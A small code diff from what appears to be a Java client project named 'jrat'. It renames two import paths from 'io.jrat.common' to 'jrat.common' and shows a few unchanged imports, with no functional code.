@@ -1,7 +1,7 @@
 package jrat.client;
 
-import io.jrat.common.Constants;
-import io.jrat.common.downloadable.Downloadable;
+import jrat.common.Constants;
+import jrat.common.downloadable.Downloadable;
 import jrat.client.packets.Temp;
 import java.io.File;
 import java.io.FileOutputStream;
